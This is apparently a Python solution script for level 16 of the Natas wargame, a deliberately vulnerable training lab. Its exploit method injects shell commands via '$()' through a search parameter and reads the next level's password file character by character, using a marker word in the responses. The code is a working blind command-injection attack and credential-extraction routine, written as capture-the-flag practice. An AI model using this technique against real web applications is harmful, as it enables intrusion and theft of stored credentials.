import re
from src.natas.base_level import NatasLevel
import string

class Level_16(NatasLevel):

  num = 16
  explanation = "On this level, command injection via `$()` bypasses the character filter.\n     We first identify valid password characters, then brute-force the password one character at a time."

  def exploit(self) -> str:

    CHARS  = string.ascii_letters + string.digits
    M_CHAR = []

    for i in range(len(CHARS)):
      char    = CHARS[i]
      PAYLOAD = f"$(grep {char} /etc/natas_webpass/natas17)Africans"
      resp    = self.session.get(self.base_url + "/index.php", params = {"needle": PAYLOAD})
      if re.search(r'Africans', resp.text) == None:
        M_CHAR.append(char)

    PASSWD = ""
    while True:
      FOUND = False
      for item in M_CHAR:
        PAYLOAD   = f"$(grep ^{PASSWD}{item} /etc/natas_webpass/natas17)Africans"
        resp      = self.session.get(self.base_url + "/index.php", params = {"needle": PAYLOAD})
        if re.search(r'Africans', resp.text) == None:
          PASSWD += item
          FOUND = True
          break
      if FOUND == False:
        break

    return PASSWD
